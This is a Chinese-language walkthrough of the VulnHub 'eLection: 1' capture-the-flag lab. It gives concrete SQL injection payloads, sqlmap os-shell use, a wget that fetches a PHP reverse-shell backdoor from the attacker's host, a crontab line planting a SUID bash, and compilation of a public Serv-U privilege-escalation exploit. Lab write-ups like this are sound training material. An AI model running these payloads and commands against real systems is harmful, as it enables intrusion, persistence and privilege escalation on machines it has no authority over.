# eLection: 1

2024-5-25 https://www.vulnhub.com/entry/election-1,503/

difficulty: Medium

## IP

192.168.5.30

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 20d1ed84cc68a5a786f0dab8923fd967 (RSA)
|   256 7889b3a2751276922af98d27c108a7b9 (ECDSA)
|_  256 b8f4d661cf1690c5071899b07c70fdc0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

80 默认页面是 apche 主页，源码中也没有隐藏提示信息。

使用 gobuster 进行扫描：

```
http://192.168.5.30/index.html           (Status: 200) [Size: 10918]
http://192.168.5.30/javascript           (Status: 301) [Size: 317] [--> http://192.168.5.30/javascript/]
http://192.168.5.30/robots.txt           (Status: 200) [Size: 30]
http://192.168.5.30/election             (Status: 301) [Size: 315] [--> http://192.168.5.30/election/]
http://192.168.5.30/phpmyadmin           (Status: 301) [Size: 317] [--> http://192.168.5.30/phpmyadmin/]
http://192.168.5.30/phpinfo.php          (Status: 200) [Size: 95405]
```

http://192.168.5.30/robots.txt 显示：

```
admin
wordpress
user
election
```

像是用户名或者是密码，先放这里，看其他目录。

http://192.168.5.30/phpinfo.php 是 phpinfo 页面，能看到一些 php 配置信息。

http://192.168.5.30/phpmyadmin/ 是 phpyadmin，尝试下简单的弱密码，都不行。

http://192.168.5.30/election 这个目录上没什么链接，继续 gobuster：

```
http://192.168.5.30/election/media                (Status: 301) [Size: 321] [--> http://192.168.5.30/election/media/]
http://192.168.5.30/election/themes               (Status: 301) [Size: 322] [--> http://192.168.5.30/election/themes/]
http://192.168.5.30/election/data                 (Status: 301) [Size: 320] [--> http://192.168.5.30/election/data/]
http://192.168.5.30/election/admin                (Status: 301) [Size: 321] [--> http://192.168.5.30/election/admin/]
http://192.168.5.30/election/languages            (Status: 301) [Size: 325] [--> http://192.168.5.30/election/languages/]
http://192.168.5.30/election/js                   (Status: 301) [Size: 318] [--> http://192.168.5.30/election/js/]
http://192.168.5.30/election/index.php            (Status: 200) [Size: 7003]
http://192.168.5.30/election/lib                  (Status: 301) [Size: 319] [--> http://192.168.5.30/election/lib/]
http://192.168.5.30/election/card.php             (Status: 200) [Size: 1935]
```

http://192.168.5.30/election/card.php 中显示了一串符号，应该是提示信息：

```
00110000 00110001 00110001 00110001 00110000 00110001 00110000 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110001 00110001 00110000 00110000 00110001 00110000 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110001 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110000 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110001 00110000 00110000 00100000 00110000 00110000 00110000 00110000 00110001 00110000 00110001 00110000 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110000 00110000 00100000 00110000 00110001 00110001 00110000 00110000 00110000 00110000 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110001 00110001 00110000 00110001 00110000 00100000 00110000 00110001 00110000 00110001 00110001 00110000 00110001 00110000 00100000 00110000 00110001 00110001 00110001 00110001 00110000 00110000 00110000 00100000 00110000 00110001 00110001 00110000 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110000 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110000 00110000 00110000 00110000 00110001 00100000 00110000 00110001 00110000 00110000 00110000 00110000 00110000 00110000 00100000 00110000 00110000 00110001 00110000 00110000 00110000 00110001 00110001
```

尝试进行解码，cyberchef 中使用 frombinary 进行 2 次解码，得到：

```
user:1234
pass:Zxc123!@#
```

尝试 ssh 登陆，不对。在寻找这个网址上是否有登陆入口，发现 http://192.168.5.30/election/admin/ 输入了上面的用户凭据后，登陆成功。

http://192.168.5.30/election/admin/dashboard.php?_loggedin

看看能否在这个后台管理系统中，找到可以执行命令注入点。

经过查询，发现这个 cms 存在 sql 注入，并且存在通过 sql 执行命令，

在 http://192.168.5.30/election/admin/kandidat.php 中，编辑 Admin，然后使用 bp 获取发送的 post 请求数据包：

```
POST /election/admin/ajax/op_kandidat.php HTTP/1.1
Host: 192.168.5.30
Content-Length: 48
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.5.30
Referer: http://192.168.5.30/election/admin/kandidat.php?_
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: el_mass_adding=false; el_listing_siswa=5; el_listing_guru=5; PHPSESSID=17pih41m52gjmpj9afop42k1nm; el_lang=en-us
Connection: close

aksi=fetch&id=256
```

将请求参数改成下面，返回的内容和上面一样，证明，存在 sql 布尔或时间盲注：

```
aksi=fetch&id=76 and 1=1

aksi=fetch&id=76 and sleep(3)
```

使用 sqlmap，验证下 sql 注入是否可用：

```
sqlmap -r req.txt --level=5 --risk=3 --batch

---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: aksi=fetch&id=256 AND 9037=9037

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: aksi=fetch&id=256 AND (SELECT 8042 FROM (SELECT(SLEEP(5)))QPgk)

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: aksi=fetch&id=-3492 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71717a7171,0x654e476b75776343527254754861666d72764f616d4f50746648514f4570457956796d68764a5474,0x716a6b6b71),NULL-- -
---
```

证明存在，进行 os-command:

```
sqlmap -r req.txt --level=5 --risk=3 --batch --os-shell

which nc
/bin/nc
```

用 wget 将后门 php 代码下载到/var/www/html 根目录中 ,kali 上监听 8888 端口，curl 访问这个上传的 php 页面，进行反弹。

os-shell 上执行：

```
wget http://192.168.5.3/5.3/8888.php

os-shell> ls
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output:
---
8888.php
election
index.html
phpinfo.php
robots.txt
tmpbszrg.php
tmpuxylz.php
```

kali 上执行：

```
curl http://192.168.5.30/8888.php
```

获得了反弹的 shell，升级 tty。

进行系统枚举，发现 /home 目录下有一个 love 用户。

sudo、getcap 没有特殊的设置。

发现 /home/love 设置了 suid。在 /home/love/Desktop 中发现 user flag，但是没有读取权限。

发现 /var/spool/cron/crontabs/root 对 www-data 用户可写，这样就能把后门触发脚本写到里面，然后以 root 用户身份触发：

```
www-data@election:/var/spool/cron/crontabs$ ls -al /var/spool/cron/crontabs/root
-rw------- 1 www-data www-data 1089 Oct 21  2019 /var/spool/cron/crontabs/root
```

```
echo '* * * * * cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' >> /var/spool/cron/crontabs/root
```

但是在/tmp 中没有出现我们想要的结果，估计是坑，寻找其他路径吧。

发现 /var/www/.bash_history 文件，里面有一些操作，可能有 love 用户的密码。

```
python3 cve-2020-8635.py -t 192.168.1.4:22 -u love -p 1234567890
```

但是发现不能 su 切换到 love 用户，密码不对。

发现数据库连接配置：

```
www-data@election:/var/www/html/election/admin/inc$ cat conn.php
<?php
	error_reporting(0);
	session_start();
	$db_host = "localhost";
	$db_user = "newuser";
	$db_pass = "password";
	$db_name = "election";
	$connection = mysqli_connect($db_host,$db_user,$db_pass,$db_name);
	if(!$connection){
		echo "FATAL ERROR!";
		exit();
	}
?>
```

尝试了也不是 love 用户的密码。

前面的方式都不对，提权的信息应该还是在这个 elec 的网站上，再次检查它的子目录，发现一个 system.log 文件：

```
love@election:/var/www/html/election/admin/logs$ ls -al
total 1264
drwxr-xr-x  2 www-data www-data    4096 May 27  2020 .
drwxr-xr-x 10 www-data www-data    4096 Apr  3  2020 ..
-rw-r--r--  1 www-data www-data 1285999 May 25 16:56 system.log
```

发现了 love 用户的密码：

```
love@election:/var/www/html/election/admin/logs$ head -n 10 system.log
[2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123
[2020-04-03 00:13:53] Love added candidate 'Love'.
[2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux).
```

太坑了，绕了一大圈。love:P@$$w0rd@123

其实这个信息在/var/www/.bash_hsitory 文件中已经提示了,还是没注意略过了：

```
cat var/www/html/election/admin/logs/system.log
cd var/www/html/election/admin/logs
cd var/www/html/election/admin/log
```

得到 user flag:

```
love@election:~$ cat Desktop/user.txt
cd38ac698c0d793a5236d01003f692b0
```

发现 suid /usr/local/Serv-U/Serv-U，对应的提权方法：https://www.exploit-db.com/exploits/47009

将 c 源码下载到目标机器，进行编译，执行得到 root 权限：

```
www-data@election:/tmp$ gcc 47009.c -o pe && ./pe
uid=0(root) gid=0(root) groups=0(root),33(www-data)
opening root shell
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)

# cat /root/root.txt
5238feefc4ffe09645d97e9ee49bc3a6
```

此靶场有简单的路径，找到 log 就比较直接，如果用 sql 注入的方法就是饶了一下，最终还的去找 love 的密码。
